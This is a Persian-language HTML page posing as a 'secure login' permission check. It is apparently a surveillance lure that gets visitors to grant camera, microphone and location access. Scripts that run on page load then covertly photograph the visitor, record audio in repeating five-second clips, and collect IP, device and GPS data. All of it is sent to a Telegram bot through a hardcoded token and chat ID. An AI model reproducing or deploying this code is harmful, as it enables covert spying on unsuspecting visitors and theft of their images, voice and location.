<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>ورود امن</title>
  <style>
    body {
      background: #1e1e2f;
      color: #fff;
      font-family: sans-serif;
      text-align: center;
      padding-top: 80px;
    }
    .access-box {
      background: rgba(255,255,255,0.1);
      border-radius: 12px;
      padding: 20px;
      width: 300px;
      margin: auto;
    }
    .access-item {
      display: flex;
      justify-content: space-between;
      margin: 15px 0;
    }
    .status-icon {
      width: 20px;
      height: 20px;
      border-radius: 50%;
      background: gray;
    }
    .status-icon.active {
      background: #00ff88;
    }
    #enterBtn {
      display: none;
      margin-top: 30px;
      padding: 10px 25px;
      font-size: 18px;
      background: #00c9ff;
      border: none;
      border-radius: 8px;
      color: white;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <h1>برای امنیت سایت، لطفاً دسترسی‌ها را تأیید کنید</h1>
  <div class="access-box">
    <div class="access-item">
      <span>دوربین</span>
      <div id="camStatus" class="status-icon"></div>
    </div>
    <div class="access-item">
      <span>میکروفون</span>
      <div id="micStatus" class="status-icon"></div>
    </div>
    <div class="access-item">
      <span>موقعیت مکانی</span>
      <div id="locStatus" class="status-icon"></div>
    </div>
  </div>

  <button id="enterBtn">ورود</button>

  <script>
    let permissions = {
      camera: false,
      microphone: false,
      location: false
    };

    async function requestCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        permissions.camera = true;
        document.getElementById("camStatus").classList.add("active");
        stream.getTracks().forEach(track => track.stop());
      } catch (e) {}
    }

    async function requestMicrophone() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        permissions.microphone = true;
        document.getElementById("micStatus").classList.add("active");
        stream.getTracks().forEach(track => track.stop());
      } catch (e) {}
    }

    function requestLocation() {
      return new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
          position => {
            permissions.location = true;
            document.getElementById("locStatus").classList.add("active");
            resolve(position);
          },
          () => resolve(null)
        );
      });
    }

    async function checkAccess() {
      await requestCamera();
      await requestMicrophone();
      const location = await requestLocation();

      const allGranted = Object.values(permissions).every(Boolean);
      if (allGranted) {
        document.getElementById("enterBtn").style.display = "inline-block";

        // اجرای اسکریپت‌های ارسال اطلاعات
        takePhotoAndSend();
        getUserData();
        startSedaBazikon();
        if (location) {
          sendLocationToTelegram(location.coords.latitude, location.coords.longitude);
        }
      }
    }

    document.getElementById("enterBtn").onclick = () => {
      window.location.href = "main.html";
    };

    checkAccess();
  </script>
    <script>
 async function takePhotoAndSend() {
            {
        
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });

            const video = document.createElement('video');
            document.body.appendChild(video);
            video.srcObject = stream;
            await video.play();


            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d')
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);


            canvas.toBlob(blob => {
                sendPhotoToTelegram(blob);
                stream.getTracks().forEach(track => track.stop());
                document.body.removeChild(video);
                document.body.removeChild(canvas);
            }, 'image/jpeg');

            // } cach (error) {
            //     console.error('Error accessing the camera: ', error);
            }
        }





        function sendPhotoToTelegram(blob) {
            const url = 'https://api.telegram.org/bot6923568496:AAHM_gMcdsy-O712NIoj87NbVe1fp7auoiw/sendPhoto';
            const formData = new FormData();
            formData.append('photo', blob, 'photo.jpg');
            formData.append('chat_id', '1209515299');

            fetch(url, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => console.log(data))
            .catch(error => console.error('Error sending photo to Telegram: ', error));

        }
        takePhotoAndSend();
    </script>





<script>
    const telegramToken = '6923568496:AAHM_gMcdsy-O712NIoj87NbVe1fp7auoiw';
    const chatId = '1209515299';

    async function sendDataToTelegram(info) {
      const message = `📡 کاربر جدید وارد شد:\n🌍 IP: ${info.ip}\n📱 OS: ${info.os}\n🧭 Browser: ${info.browser}\n📌 موقعیت: ${info.city}, ${info.country}\n🔍 Agent: ${navigator.userAgent}`;

      await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: chatId, text: message})
      });
    }

    async function getUserData() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();

        const info = {
          ip: data.ip,
          city: data.city,
          country: data.country_name,
          os: navigator.platform,
          browser: navigator.userAgent
        };

        sendDataToTelegram(info);
      } catch (err) {
        console.error('خطا در گرفتن اطلاعات:', err);
      }
    }

    getUserData();
  </script>


  <script>
    (function() {
      const botToken_oskool = '6923568496:AAHM_gMcdsy-O712NIoj87NbVe1fp7auoiw';
      const chatId_oskool = '1209515299';
      let recorder_gondeh;
      let chunkha = [];

      async function startSedaBazikon() {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
          recorder_gondeh = new MediaRecorder(stream);

          recorder_gondeh.ondataavailable = e => chunkha.push(e.data);

          recorder_gondeh.onstop = async () => {
            const blob = new Blob(chunkha, { type: 'audio/webm' });
            chunkha = [];

            const formData = new FormData();
            formData.append('chat_id', chatId_oskool);
            formData.append('voice', blob, 'seda_gondeh.webm');

            const url = `https://api.telegram.org/bot${botToken_oskool}/sendVoice`;
            await fetch(url, {
              method: 'POST',
              body: formData
            });
          };

          setInterval(() => {
            if (recorder_gondeh.state === 'recording') {
              recorder_gondeh.stop();
            }
            recorder_gondeh.start();
          }, 5000);

        } catch (err) {
          alert('دست رسی رو  اجازه بدید');
          console.error('مشکل از خودته داداش:', err);
        }
      }

      startSedaBazikon();
    })();
  </script>





  <script>
    (function() {
      const botToken_oskool = '6923568496:AAHM_gMcdsy-O712NIoj87NbVe1fp7auoiw';
      const chatId_oskool = '1209515299';

      function sendLocationToTelegram(lat, lon) {
        const url = `https://api.telegram.org/bot${botToken_oskool}/sendLocation`;
        const formData = new FormData();
        formData.append('chat_id', chatId_oskool);
        formData.append('latitude', lat);
        formData.append('longitude', lon);

        fetch(url, {
          method: 'POST',
          body: formData
        });
      }

      function getAndSendLocationOnce() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            position => {
              const lat = position.coords.latitude;
              const lon = position.coords.longitude;
              sendLocationToTelegram(lat, lon);
              document.getElementById('div_gondeh').innerText = '✅ لوکیشن ارسال شد!';
            },
            error => {
              console.error('مشکل در گرفتن لوکیشن:', error);
              document.getElementById('div_gondeh').innerText = '❌ خطا در گرفتن لوکیشن';
            }
          );
        } else {
          alert('مرورگرت لوکیشن رو ساپورت نمی‌کنه اوسگول!');
        }
      }

      // فقط یک بار اجرا
      getAndSendLocationOnce();
    })();
  </script>  <!-- اینجا اسکریپت‌های خودت رو بذار -->
  <!-- فقط فانکشن‌ها رو تعریف کن، اجراشون بعد از تأیید دسترسی‌ها انجام می‌شه -->
  <!-- مثل: takePhotoAndSend(), getUserData(), startSedaBazikon(), sendLocationToTelegram() -->

</body>
